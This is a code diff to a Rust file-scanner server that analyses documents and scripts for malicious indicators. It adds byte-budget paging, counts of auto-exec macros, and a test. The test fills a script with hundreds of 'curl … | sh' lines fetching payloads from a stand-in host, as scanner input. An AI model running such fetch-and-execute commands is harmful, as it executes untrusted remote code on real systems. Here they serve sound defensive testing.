@@ -29,7 +29,9 @@ use crate::{
 };
 
 use super::{
-    output::{input_schema_with_budget, page, parse_request, respond, tool_error, DEFAULT_LIMIT},
+    output::{
+        fit_rows, input_schema_with_budget, page, parse_request, respond, tool_error, DEFAULT_LIMIT,
+    },
     paths::Expect,
     state::{mark_section, ServerState},
     FileScannerMcp,
@@ -88,7 +90,7 @@ impl FileScannerMcp {
             Err(message) => return Ok(tool_error(message)),
         };
         Ok(match self.run_document(&path, &request).await {
-            Ok(value) => respond(value, budget),
+            Ok(value) => respond(fit_pages(value, budget), budget),
             Err(message) => tool_error(message),
         })
     }
@@ -119,10 +121,35 @@ impl FileScannerMcp {
             Err(message) => return Ok(tool_error(message)),
         };
         Ok(match self.run_script(&path, &request).await {
-            Ok(value) => respond(value, budget),
+            Ok(value) => respond(fit_pages(value, budget), budget),
             Err(message) => tool_error(message),
         })
     }
+}
+
+/// Cut the page object (`findings` or `source`) to the byte budget with
+/// `fit_rows`, so `returned`, `next_offset` and the hint describe the rows
+/// actually sent and following `next_offset` skips nothing.
+fn fit_pages(mut value: Value, budget: usize) -> Value {
+    let size = |v: &Value| serde_json::to_vec(v).map(|b| b.len()).unwrap_or(0);
+    for key in ["findings", "source"] {
+        let Some(mut page_value) = value.get_mut(key).map(Value::take) else {
+            continue;
+        };
+        if page_value.get("items").is_none() {
+            value[key] = page_value;
+            continue;
+        }
+        // Budget left for the page once the rest of the answer is counted.
+        let rest = size(&value);
+        let room = budget.saturating_sub(rest);
+        let offset = page_value["offset"].as_u64().unwrap_or(0) as usize;
+        let total = page_value["total"].as_u64().unwrap_or(0) as usize;
+        // fit_rows keeps 400 bytes back for the hint it may add.
+        fit_rows(&mut page_value, "items", room, offset, total);
+        value[key] = page_value;
+    }
+    value
 }
 
 /// Arguments of `analyze_document`.
@@ -134,7 +161,7 @@ pub struct DocumentRequest {
     #[schemars(
         description = "Only findings of this category. PDF: action, script, link, launch, \
                        submit, attachment, evasion, encryption. Office: auto_exec, keyword, \
-                       network"
+                       network, modules (one row per VBA module)"
     )]
     pub category: Option<String>,
     #[schemars(
@@ -395,7 +422,7 @@ fn pdf_document_value(scan: &PdfScan) -> Value {
         );
     }
     next_steps.push(
-        "analyze_file {file_path, hex_dump: true, hex_dump_offset} shows the bytes at an offset"
+        "read_hex {file_path, offset, length} shows the raw bytes at an offset (an evidence offset above)"
             .to_string(),
     );
     json!({
@@ -481,6 +508,7 @@ fn office_document_value(report: &OfficeReport) -> Value {
                 "lines": total_lines,
                 "lines_kept": lines.len(),
                 "has_source": module.source_code.is_some(),
+                "partial": report.partial_modules.contains(&module.name),
             }));
             if let Some(source) = &module.source_code {
                 for entry in detect_auto_exec_entries(source, &module.name) {
@@ -564,6 +592,12 @@ fn office_document_value(report: &OfficeReport) -> Value {
             "{keyword_total} keyword hits in all; only the first {MAX_KEYWORD_FINDINGS} are kept."
         ));
     }
+    if auto_exec_total > MAX_AUTO_EXEC_FINDINGS {
+        notes.push(format!(
+            "{auto_exec_total} auto-exec entry points in all; only the first \
+             {MAX_AUTO_EXEC_FINDINGS} are listed."
+        ));
+    }
     if module_rows
         .iter()
         .any(|m| m["lines"].as_u64().unwrap_or(0) > MAX_MODULE_LINES as u64)
@@ -602,13 +636,26 @@ fn office_document_value(report: &OfficeReport) -> Value {
                     .security_assessment
                     .risk_factors
                     .iter()
-                    .map(|f| f.description.clone())
+                    .map(|f| {
+                        let listed = analysis.suspicious_indicators.auto_exec_macros.len();
+                        if f.description.starts_with("Auto-executing macros found")
+                            && auto_exec_total > listed
+                        {
+                            format!(
+                                "Auto-executing macros found: {auto_exec_total} entry points \
+                                 ({listed} listed)"
+                            )
+                        } else {
+                            f.description.clone()
+                        }
+                    })
                     .collect::<Vec<_>>(),
             },
             "counts": {
                 "streams": analysis.streams.len(),
                 "modules": module_rows.len(),
                 "auto_exec": analysis.suspicious_indicators.auto_exec_macros.len(),
+                "auto_exec_total": auto_exec_total,
                 "findings": findings.len(),
             },
             "metadata": {
@@ -662,6 +709,24 @@ fn slice_document(full: &Value, request: &DocumentRequest, cache: &str) -> Resul
             .map(|(index, line)| format!("{}: {}", index + 1, line.as_str().unwrap_or("")))
             .collect();
         out.insert("module".into(), json!(name));
+        if let Some(row) = full["module_rows"].as_array().and_then(|rows| {
+            rows.iter()
+                .find(|r| r["name"].as_str() == Some(name.as_str()))
+        }) {
+            out.insert("lines".into(), row["lines"].clone());
+            out.insert("lines_kept".into(), row["lines_kept"].clone());
+            if row["partial"] == json!(true) {
+                out.insert(
+                    "note".into(),
+                    json!("This module was read only in part (work budget); its source is incomplete."),
+                );
+            } else if row["lines"].as_u64() > row["lines_kept"].as_u64() {
+                out.insert(
+                    "note".into(),
+                    json!("The module has more lines than are kept for paging; see lines and lines_kept."),
+                );
+            }
+        }
         out.insert("source".into(), page(&numbered, offset, limit));
         return Ok(Value::Object(out));
     }
@@ -1034,6 +1099,62 @@ mod tests {
         let value: serde_json::Value = serde_json::from_str(&text(&second)).unwrap();
         assert_eq!(value["cache"], "hit");
         assert_eq!(value["findings"]["total"], 1);
+        client.cancel().await.unwrap();
+    }
+
+    #[tokio::test]
+    async fn a_page_cut_by_the_byte_budget_loses_no_rows_when_followed() {
+        let dir = TempDir::new().unwrap();
+        let path = dir.path().join("many.sh");
+        let mut script = String::from("#!/bin/sh\n");
+        for n in 0..600 {
+            script.push_str(&format!("curl -s http://example.test/payload{n}.sh | sh\n"));
+        }
+        std::fs::write(&path, script).unwrap();
+        let client = client().await;
+        let mut seen = 0usize;
+        let mut offset = 0usize;
+        let mut pages = 0;
+        loop {
+            let reply = client
+                .call_tool(call(
+                    "analyze_script",
+                    serde_json::json!({"file_path": path, "limit": 500,
+                                       "offset": offset, "max_output_bytes": 4000}),
+                ))
+                .await
+                .unwrap();
+            assert_ne!(reply.is_error, Some(true), "{}", text(&reply));
+            let value: serde_json::Value = serde_json::from_str(&text(&reply)).unwrap();
+            let page = &value["findings"];
+            let rows = page["items"].as_array().unwrap().len();
+            assert_eq!(page["returned"], rows, "returned must count the rows sent");
+            assert!(rows > 0);
+            seen += rows;
+            pages += 1;
+            match page["next_offset"].as_u64() {
+                Some(next) => {
+                    assert_eq!(next as usize, offset + rows);
+                    offset = next as usize;
+                }
+                None => break,
+            }
+            assert!(pages < 2000);
+        }
+        let total_rows = {
+            let reply = client
+                .call_tool(call(
+                    "analyze_script",
+                    serde_json::json!({"file_path": path, "limit": 1}),
+                ))
+                .await
+                .unwrap();
+            let value: serde_json::Value = serde_json::from_str(&text(&reply)).unwrap();
+            value["findings"]["total"].as_u64().unwrap() as usize
+        };
+        assert!(total_rows >= 600);
+        assert_eq!(seen, total_rows);
+        assert!(pages > 1);
         client.cancel().await.unwrap();
     }
 
